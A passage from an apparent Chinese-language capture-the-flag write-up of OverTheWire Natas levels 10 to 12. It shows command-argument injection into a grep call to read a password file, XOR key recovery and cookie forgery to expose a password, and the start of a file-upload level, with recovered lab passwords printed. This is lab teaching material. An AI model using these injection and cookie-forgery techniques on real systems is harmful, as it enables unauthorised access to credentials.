alt="image-20230818001227200"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas10.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 初始化变量 $key 为空字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;needle&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;needle&quot;</span>]; <span class="comment">// 如果 $_REQUEST 中存在 &quot;needle&quot; 键，将其值赋给变量 $key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[;|&amp;]/&#x27;</span>,<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Input contains an illegal character!&quot;</span>; <span class="comment">// 如果 $key 中包含分号（;）、竖线（|）或和符号（&amp;），打印出错误提示信息</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;grep -i <span class="subst">$key</span> dictionary.txt&quot;</span>); <span class="comment">// 如果 $key 不为空，执行 &quot;grep -i $key dictionary.txt&quot; 命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/787c51f733a832df7bc404497ae12a63f22.png" alt="image-20230818001335274"></p><ul><li>解析说明</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Level 9 第一个解法</span></span><br><span class="line"><span class="comment"># grep -i a /etc/natas_webpass/natas11 dictionary.txt</span></span><br><span class="line">http://natas10.natas.labs.overthewire.org/?needle=a /etc/natas_webpass/natas11&amp;submit=Search</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 类似第一个方法，但更好</span></span><br><span class="line"><span class="comment"># 在文件/etc/natas_webpass/natas11中查找包含字母的行</span></span><br><span class="line"><span class="comment"># grep -i [a-zA-Z] /etc/natas_webpass/natas11 # dictionary.txt</span></span><br><span class="line">http://natas10.natas.labs.overthewire.org/?needle=[a-zA-Z] /etc/natas_webpass/natas11 <span class="comment">#&amp;submit=Search</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># /etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/c79e6fb38e606eb444673dceaa286c24d72.png" alt="image-20230716232549185"></p><h2 id="Level-11——异或解码"><a href="#Level-11——异或解码" class="headerlink" title="Level 11——异或解码"></a>Level 11——异或解码</h2><ul><li>Cookie使用XOR加密进行保护。背景颜色：</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/72f965757986635997e2ae5f5dd22d78c14.png" alt="image-20230818001416820"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas11.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$defaultdata</span> = <span class="keyword">array</span>( <span class="string">&quot;showpassword&quot;</span>=&gt;<span class="string">&quot;no&quot;</span>, <span class="string">&quot;bgcolor&quot;</span>=&gt;<span class="string">&quot;#ffffff&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span>(<span class="params"><span class="variable">$in</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;&lt;censored&gt;&#x27;</span>; <span class="comment">// 设置密钥，在这里被隐藏起来了</span></span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$in</span>;</span><br><span class="line">    <span class="variable">$outText</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过每个字符进行迭代</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$outText</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)]; <span class="comment">// 使用异或运算加密字符</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$outText</span>; <span class="comment">// 返回加密后的字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$def</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_COOKIE</span>;</span><br><span class="line">    <span class="variable">$mydata</span> = <span class="variable">$def</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;data&quot;</span>, <span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line">        <span class="variable">$tempdata</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>])), <span class="literal">true</span>); <span class="comment">// 解码并解密Cookie中的数据</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$tempdata</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;showpassword&quot;</span>, <span class="variable">$tempdata</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;bgcolor&quot;</span>, <span class="variable">$tempdata</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;</span>, <span class="variable">$tempdata</span>[<span class="string">&#x27;bgcolor&#x27;</span>])) &#123; <span class="comment">// 检查颜色值是否符合要求</span></span><br><span class="line">                <span class="variable">$mydata</span>[<span class="string">&#x27;showpassword&#x27;</span>] = <span class="variable">$tempdata</span>[<span class="string">&#x27;showpassword&#x27;</span>]; <span class="comment">// 更新默认数据数组</span></span><br><span class="line">                <span class="variable">$mydata</span>[<span class="string">&#x27;bgcolor&#x27;</span>] = <span class="variable">$tempdata</span>[<span class="string">&#x27;bgcolor&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mydata</span>; <span class="comment">// 返回加载的数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveData</span>(<span class="params"><span class="variable">$d</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$d</span>)))); <span class="comment">// 将加密后的数据存储到Cookie中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">loadData</span>(<span class="variable">$defaultdata</span>); <span class="comment">// 加载数据到$data变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;bgcolor&quot;</span>,<span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;bgcolor&#x27;</span>])) &#123; <span class="comment">// 检查请求中的颜色值是否符合要求</span></span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;bgcolor&#x27;</span>] = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;bgcolor&#x27;</span>]; <span class="comment">// 更新背景颜色</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">saveData</span>(<span class="variable">$data</span>); <span class="comment">// 保存更新后的数据到Cookie中</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;natas11&lt;/h1&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;content&quot;</span>&gt;</span><br><span class="line">&lt;body style=<span class="string">&quot;background: &lt;?=<span class="subst">$data</span>[&#x27;bgcolor&#x27;]?&gt;;&quot;</span>&gt; &lt;!-- 使用背景颜色设置页面的背景样式 --&gt;</span><br><span class="line"></span><br><span class="line">Cookies are <span class="keyword">protected</span> with XOR encryption&lt;br/&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&quot;showpassword&quot;</span>] == <span class="string">&quot;yes&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;</span>; <span class="comment">// 显示密码信息，实际密码被隐藏起来了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/07df294a8b6c521e81be50f883a989a5726.png" alt="image-20230818001535782"></p><ul><li>理解源码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 理解：</span></span><br><span class="line"><span class="comment"># 首先，调用 loadData() 函数并将结果（解密数据）赋予 $data；其次，通过一个 if 语句更新背景色；最后，调用 saveData() 函数进行加密并写道 cookie 中。</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># base64 解码，再进行异或运算的逆推，这就要求找到异或运算的密钥了，在哪呢？有一串默认的密文可以解码，能逆推吗？</span></span><br><span class="line"><span class="comment"># cookie 原文：</span></span><br><span class="line">data=MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKHgqLX4ubjY%3D</span><br><span class="line"><span class="comment"># url 解码</span></span><br><span class="line">MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKHgqLX4ubjY=</span><br><span class="line"><span class="comment"># base64 解码</span></span><br><span class="line"><span class="number">0l</span>;$$<span class="number">98</span>-<span class="number">8</span>=?<span class="comment">#9*jvi &#x27;ngl*+(!$#9lrnh(x*-~.n6</span></span><br><span class="line"><span class="comment"># 在异或加密中，只要知道“明文”、“密钥”、“密文”之二，即可猜出另一个数据，详见下一个代码块</span></span><br><span class="line"><span class="comment"># 明文（数组转json格式）</span></span><br><span class="line">&#123;<span class="string">&quot;showpassword&quot;</span>:<span class="string">&quot;no&quot;</span>,<span class="string">&quot;bgcolor&quot;</span>:<span class="string">&quot;#ffffff&quot;</span>&#125;</span><br><span class="line"><span class="comment"># 异或运算解码详见：php 解码脚本</span></span><br></pre></td></tr></table></figure><ul><li>异或运算说明</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 异或运算（二进制）：相同则结果为0，不同则结果为1</span></span><br><span class="line"><span class="comment"># 举例:</span></span><br><span class="line"><span class="comment"># 明文：1110 0110</span></span><br><span class="line"><span class="comment"># 密钥：0111 1010</span></span><br><span class="line"><span class="comment"># 密文：1001 1100</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 明文明文：1001 0110 1011 1100</span></span><br><span class="line"><span class="comment"># 密钥密钥：1110 0001</span></span><br><span class="line"><span class="comment"># 重复密钥：1110 0001 1110 0001</span></span><br><span class="line"><span class="comment"># 密文密文：0111 0111 0101 1101</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 从上可知，知道“明文”、“密钥”、“密文”之二，即可猜出另一个数据</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 解密脚本，详见下一个代码块</span></span><br></pre></td></tr></table></figure><ul><li>解码脚本</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php 解码脚本</span></span><br><span class="line"><span class="comment"># https://c.runoob.com/compile/1/</span></span><br><span class="line"><span class="comment"># 得到密钥：KNHL</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="string">&quot;MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKHgqLX4ubjY=&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_decrypt</span>(<span class="params"><span class="variable">$in</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;showpassword&quot;</span> =&gt; <span class="string">&quot;no&quot;</span>, <span class="string">&quot;bgcolor&quot;</span> =&gt; <span class="string">&quot;#ffffff&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n明文：&quot;</span> . <span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$in</span>;</span><br><span class="line">    <span class="variable">$outText</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$outText</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$outText</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$base64</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookie</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64解码：&quot;</span> . <span class="variable">$base64</span>;</span><br><span class="line"><span class="variable">$xor</span> = <span class="title function_ invoke__">xor_decrypt</span>(<span class="variable">$base64</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n密文：&quot;</span> . <span class="variable">$xor</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/dbbe4650930d9046b5197ed551776f609c2.png" alt="image-20230717233843442"></p><ul><li>加密脚本</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原文截取并稍作修改</span></span><br><span class="line"><span class="comment"># 密文：MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_encrypt</span>(<span class="params"><span class="variable">$in</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;KNHL&#x27;</span>; <span class="comment"># 密钥</span></span><br><span class="line">    <span class="variable">$text</span> = <span class="variable">$in</span>; <span class="comment"># 明文</span></span><br><span class="line">    <span class="variable">$outText</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="comment"># 进行异或处理，密钥不够长则循环使用密钥</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$text</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$outText</span> .= <span class="variable">$text</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment"># 返回密文</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$outText</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 1. 模拟正常传入数组</span></span><br><span class="line"><span class="comment"># 2. 转 json 格式</span></span><br><span class="line"><span class="comment"># 3. 进行异或处理</span></span><br><span class="line"><span class="comment"># 4. 最后进行base64编码</span></span><br><span class="line"><span class="variable">$defaultdata</span> = <span class="keyword">array</span>( <span class="string">&quot;showpassword&quot;</span>=&gt;<span class="string">&quot;yes&quot;</span>, <span class="string">&quot;bgcolor&quot;</span>=&gt;<span class="string">&quot;#ffffff&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">xor_encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$defaultdata</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/42a3871f2132a4a1b56525d4334b1b563db.png" alt="image-20230720223402352"></p><ul><li>修改cookie为现在生成的密文：MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The password <span class="keyword">for</span> natas12 <span class="keyword">is</span> YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/6cb890dd10583f0ed6aa9a7a2ac10514ea8.png" alt="image-20230720223920893"></p><h2 id="Level-12——文件上传-更改默认后缀"><a href="#Level-12——文件上传-更改默认后缀" class="headerlink" title="Level 12——文件上传-更改默认后缀"></a>Level 12——文件上传-更改默认后缀</h2><ul><li>选择要上载的JPEG（最大1KB）：</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/d8e62ba1ec470462120bf1354792e90ac1b.png" alt="image-20230818001637484"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas12.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成一个随机字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">10</span>; <span class="comment">// 字符串长度</span></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>; <span class="comment">// 可用字符集</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$p</span> = <span class="number">0</span>; <span class="variable">$p</span> &lt; <span class="variable">$length</span>; <span class="variable">$p</span>++) &#123;</span><br><span class="line">        <span class="variable">$string</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>)-<span class="number">1</span>)]; <span class="comment">// 从字符集中随机选择一个字符拼接到字符串中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成一个随机的文件路径，确保路径不存在重复文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$ext</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">genRandomString</span>().<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>; <span class="comment">// 生成带有随机字符串和指定扩展名的文件路径</span></span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>)); <span class="comment">// 检查路径是否已经存在文件，如果存在则重新生成路径</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据原始文件名生成一个随机的文件路径</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$fn</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fn</span>, PATHINFO_EXTENSION); <span class="comment">// 获取原始文件名的扩展名</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">makeRandomPath</span>(<span class="variable">$dir</span>, <span class="variable">$ext</span>); <span class="comment">// 调用makeRandomPath函数生成随机文件路径</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="comment">// 使用POST请求中的文件名生成一个随机的目标文件路径</span></span><br><span class="line">    <span class="variable">$target_path</span> = <span class="title function_ invoke__">makeRandomPathFromFilename</span>(<span class="string">&quot;upload&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查临时存储在服务器上的上传文件的大小是否超过限制（1KB）</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is too big&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 将临时存储在服务器上的上传文件移动到指定的目标路径</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">            <span class="comment">// 上传成功</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file &lt;a href=\&quot;<span class="subst">$target_path</span>\&quot;&gt;<span class="subst">$target_path</span>&lt;/a&gt; has been uploaded&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 上传失败</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 显示文件上传表单</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;index.php&quot;</span> method=<span 